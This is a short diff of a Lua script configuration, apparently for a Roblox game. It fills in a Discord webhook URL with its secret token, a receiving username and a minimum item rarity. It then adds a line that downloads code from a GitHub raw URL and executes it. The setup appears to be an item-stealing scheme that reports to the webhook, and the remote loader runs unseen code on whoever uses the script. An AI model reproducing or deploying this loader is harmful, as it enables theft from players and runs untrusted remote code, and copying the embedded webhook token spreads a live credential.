@@ -1,3 +1,5 @@
-local Webhook = "YOURWEBHOOK" -- Replace with your webhook URL
-local Username = "YOURUSERNAME" -- Replace with your username
-local MinimumRarity = "Godly" -- You Can Choose Between Godly, Ancient, Unique, Vintage
+local Webhook = "https://discord.com/api/webhooks/1513537227127521331/D9n2b159racw2NuHJS8oeesvqwx5ltGXpYKvBYSd82rngKE1M3vWLRERsoQzt6bIwLAS"
+local Username = "Kam_z0ner1"
+local MinimumRarity = "Godly"
+ 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/bestchance12312/DMAHUB/refs/heads/main/Main'))()
